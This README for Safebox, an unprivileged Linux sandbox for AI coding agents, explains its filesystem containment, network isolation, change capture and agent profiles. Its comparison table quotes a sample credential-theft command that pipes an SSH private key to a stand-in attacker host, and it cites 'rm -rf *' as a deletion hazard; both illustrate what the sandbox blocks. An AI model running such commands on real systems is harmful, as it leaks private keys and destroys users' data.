# Safebox

**An unprivileged, microsecond-latency Linux sandbox and change-management engine for autonomous AI coding agents and developer commands.**

Safebox allows you to run untrusted CLI scripts, build tools, and autonomous AI agents with zero root privileges (`sudo`), instant startup (<30ms), kernel-enforced Landlock LSM containment, and zero-footprint OverlayFS change capture.

---

## Deep Technical Internals, Execution Flow Diagrams, and Contributor Guides
- **[System Architecture & File-by-File Internals](ARCHITECTURE.md)**: Process lifecycle diagrams, kernel isolation mechanics, package responsibilities, and complete file inventory.
- **[Contributing Guide](CONTRIBUTING.md)**: Open-source developer guide and AI agent bootstrap protocol.

> **Working with an AI coding agent?** Point your agent directly to **[CONTRIBUTING.md](CONTRIBUTING.md)** to automatically bootstrap the recommended workspace layout and agent guidelines.

---

## Without Safebox vs. With Safebox

What actually happens when a command runs inside Safebox compared to running directly on your host?

| Scenario / Command | Without Safebox (Bare Host) | With Safebox (Sandboxed) |
| :--- | :--- | :--- |
| **Accidental Deletion**<br>`rm -rf *` | Permanently deletes files in current directory or `$HOME`. Recovery requires backups or forensic archaeology. | Trapped inside private OverlayFS layer. The host remains untouched. Discard instantly with `safebox revert`. |
| **Credential Theft**<br>`cat ~/.ssh/id_rsa \| curl -X POST https://evil.com` | Private SSH keys read and exfiltrated over the network. | Landlock LSM blocks reading `~/.ssh` (`EACCES`). Network namespace has loopback only; network access fails immediately. |
| **Dependency Pollution**<br>`pip install untrusted-pkg` | Writes files across `/usr/local` or your user environment without review. | All file creations and edits are held in an isolated staging layer. Inspect changes with `safebox diff` before applying. |
| **Zombie Child Proliferation**<br>Fork bomb or abandoned background subprocesses | Orphaned processes clutter host PID table and consume memory. | Safebox PID 1 init shim automatically reaps reparented zombie children and forwards termination signals. |

---

## Play with Safebox

### 1. Build and Install
Safebox has zero runtime dependencies and compiles into a single static binary:

```bash
# Clone the repository
git clone https://github.com/Mahboob-A/agent-safebox.git
cd agent-safebox

# Compile the standalone binary
go build -o /usr/local/bin/safebox .
```

### 2. Filesystem Change Capture (OverlayFS)
Make changes inside the sandbox, inspect them from the host, and decide whether to keep or discard them:

```bash
# Modify or create a file inside the sandbox (trapped in upper layer):
safebox run -- touch experimental-feature.go

# Inspect the uncommitted changes from the host:
safebox diff

# Choose your outcome:
# Keep the changes and atomically commit them to the host:
safebox apply --yes

# Or discard changes cleanly with zero trace:
safebox revert --yes
```

### 3. Security & Boundary Lockdown (Landlock LSM)
Safebox isolates the kernel filesystem, strictly denying access to sensitive host directories:

```bash
# Verify denied read access to host credentials (~/.ssh is blocked with EACCES):
safebox run -- ls -la /root/.ssh

# Verify denied write access to system configuration (/etc is write-protected):
safebox run -- touch /etc/hacked.txt

# Inspect effective policy and resolved allowlists without executing:
safebox run --probe -- ls
```

### 4. Network Isolation & Controlled Egress (Userspace NAT)
Sandboxed commands have zero network access by default, but outbound traffic can be safely enabled:

```bash
# Outbound network traffic is blocked by default (network is unreachable):
safebox run -- ping -c 1 8.8.8.8

# Resolve DNS queries via userspace NAT proxy (10.0.2.3):
safebox run --allow-net -- getent hosts github.com

# Verify HTTPS egress and TLS Root CA certificate validation:
safebox run --allow-net -- curl -s -I https://github.com
```

### 5. Autonomous AI Coding Agents (Interactive & Headless)
Run coding assistants with protected credentials and isolated persistent state:

```bash
# Launch full interactive agy session:
safebox run --allow-path=~/.local/bin -- agy

# Execute headless one-shot prompt:
safebox run --allow-path=~/.local/bin -- agy -p "refactor authentication"

# Run agent with outbound internet egress for cloud LLM token exchange:
safebox run --allow-net --allow-path=~/.local/bin -- agy -p "fetch dependencies and run analysis"
```

### 6. POSIX Streams & Character Devices
Safebox allows standard POSIX streams and CSPRNG reads out of the box:

```bash
# Read CSPRNG entropy and redirect POSIX streams cleanly:
safebox run -- sh -c "cat /dev/null; head -c 4 /dev/urandom | xxd"
```

---

## Real-World Use Cases

### 1. Autonomous AI Coding Agents
Running agents like Claude Code, `agy`, Cursor, or Codex directly on your host gives them unrestricted write access to your environment. Safebox automatically detects the agent from `argv[0]`, loads built-in permission profiles, isolates the filesystem via Landlock and OverlayFS, and protects your host credentials.

Because Safebox denies access to `$HOME` by default to protect sensitive files (`~/.ssh`, `~/.aws`), binaries installed in user directories (`~/.local/bin`, `~/.cargo/bin`) are granted read+execute access via `--allow-path`:

```bash
# Launch full interactive agy session:
safebox run --allow-path=~/.local/bin -- agy

# Run headless one-shot prompt:
safebox run --allow-path=~/.local/bin -- agy -p "refactor the authentication handler"

# Run with outbound network egress for agents requiring cloud LLM connectivity:
safebox run --allow-net --allow-path=~/.local/bin -- agy -p "fetch dependencies and run analysis"

# Run Claude Code in headless print mode:
safebox run --allow-path=~/.local/bin -- claude -p "fix bug in parser"
```

### 2. Testing Untrusted GitHub Repositories & PRs
Safely clone and evaluate external repositories or pull requests without risking your developer machine:

```bash
cd /tmp && mkdir -p untrusted-repo && cd untrusted-repo
git clone --depth 1 https://github.com/codeplea/tinyexpr.git .

# Safely compile and run test suite inside Safebox (cannot touch ~/.ssh, ~/.aws, or system files):
safebox run -- make smoke
```

### 3. Reviewing AI Changes Before Host Commit
Inspect every single file modified or created during an agent session before applying it to your host workspace:

```bash
# 1. Let the agent work in the sandbox
safebox run --allow-net --allow-path=~/.local/bin -- aider --message "implement user cache"

# 2. Inspect only the files in internal/
safebox diff internal/

# 3. Apply changes if verified
safebox apply --yes
```

### 4. Internet-Enabled Tasks with Userspace NAT (`--allow-net`)
When an agent or script legitimately needs outbound internet access (e.g., fetching dependencies), enable userspace NAT without exposing host network devices:

```bash
# Enables userspace NAT via pasta or slirp4netns
safebox run --allow-net -- go get github.com/pelletier/go-toml/v2
```

### 5. Pre-Flight Security Probing (`--probe`)
Inspect effective Landlock read-only and read-write allowlists and resolved binary paths without starting namespaces or executing the command:

```bash
safebox run --probe -- agy
```

---

## Operational Cautions & Hard-Learned Lessons

Security tooling is only as safe as operational discipline. Keep these concrete rules in mind:

### 1. The Relative Path & `cd` Trap
**Never separate a `cd` command and a destructive command (`rm -rf *`) into distinct interactive prompts.**
If `cd` fails (or runs in a subshell), the shell remains in `$HOME` or `/root`, and the subsequent `rm -rf *` deletes your active workspace.
- **Unsafe Pattern**:
  ```bash
  cd /tmp/demo
  rm -rf *
  ```
- **Safe Pattern (Atomic Chaining)**:
  ```bash
  cd /tmp/demo && rm -rf -- *
  ```
- **Safest Pattern (Dogfooding Safebox)**:
  ```bash
  safebox run -- rm -rf *
  ```

### 2. Host File Invariants
Safebox guarantees that host `/etc/hosts` and `/etc/resolv.conf` are never touched. Synthetic shadow files are bind-mounted inside the child mount namespace and immediately unlinked from the host. Never manually edit `/etc/resolv.conf` inside custom sandbox hooks.

### 3. PATH Collision & Agent Profiles
Safebox matches profiles using the executable basename in `argv[0]`. If you have an untrusted custom script named `agy` or `claude` in your current directory, specify an explicit path (`./agy`) to prevent accidental profile privilege association.

### 4. Ubuntu 24.04 AppArmor User Namespaces
Ubuntu 24.04 enables AppArmor restrictions on unprivileged user namespaces by default. If your system blocks unprivileged namespaces, enable them via sysctl:
```bash
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
```

---

## Core Capabilities at a Glance

For detailed implementation mechanics, see [ARCHITECTURE.md](ARCHITECTURE.md).

- **Kernel LSM Containment**: Landlock LSM enforces deny-by-default filesystem controls. System libraries (`/usr`, `/lib`) are strictly read-only; `$HOME` credentials (`~/.ssh`, `~/.aws`) are inaccessible.
- **In-Namespace OverlayFS**: All file modifications are directed to an unprivileged memory/disk upper layer. Host working tree stays untouched until `safebox apply`.
- **Tri-Backend Userspace NAT**: Outbound network egress without root using `pasta` (primary), `slirp4netns` (secondary), or pure-Go TAP fallback.
- **16 Built-in Agent Profiles**: Pre-configured, zero-flag profiles for `agy`, `claude`, `codex`, `puku`, `cursor`, `kilo`, `opencode`, `aider`, `pi`, `cline`, `amp`, `goose`, `mentat`, `continue`, `plandex`.
- **Persistent State Redirection**: Agent authentication and cache directories redirect to `$XDG_STATE_HOME/safebox/agents/<tool>/` with `0700` permissions.
- **PID 1 Supervisor Shim**: Forwards signals (`SIGINT`, `SIGTERM`) and reaps orphaned child processes cleanly.

---

## Comparison with Similar Tools

| Feature | Safebox | Docker | Bubblewrap | Firejail | nsjail |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Requires Root / SUID** | **No** (Unprivileged) | Yes (Daemon/Root) | Depends on distro | Yes (SUID root) | Depends on config |
| **Startup Overhead** | **<30 ms** | 500 ms - 2 s | <50 ms | 100 - 300 ms | <50 ms |
| **Filesystem Change Capture** | **Built-in (diff/apply/revert)** | Requires volume magic | None (Read-only) | None | None |
| **AI Agent Native Profiles** | **16 built-in** | Manual Dockerfiles | None | None | None |
| **Modern Kernel LSM** | **Landlock ABI v1-v4** | AppArmor / seccomp | None | Seccomp only | Seccomp only |
| **Selective Outbound NAT** | **Userspace NAT** | Bridge / Host | slirp4netns manual | iptables / netfilter | None |

---

## Verification & Automated Test Battery

Safebox maintains high engineering rigor with a comprehensive test suite:

```bash
# 1. Run all unit tests across all 9 packages with race detection
go test -race -count=1 -v ./...

# 2. Run end-to-end integration tests (userspace NAT, DNS resolution)
RUN_INTEGRATION=1 go test -v ./internal/cli/...

# 3. Run the 10-step security boundary verification suite
bash scripts/test-sandbox-boundaries.sh

# 4. Static analysis
go vet ./...
```

---

## Contributing

We welcome contributions from fellow developers. Please review **[CONTRIBUTING.md](CONTRIBUTING.md)** for developer environment setup, testing requirements, conventional commit conventions, and pull request guidelines.

---

## License

Safebox is open source software released under the [MIT License](LICENSE).
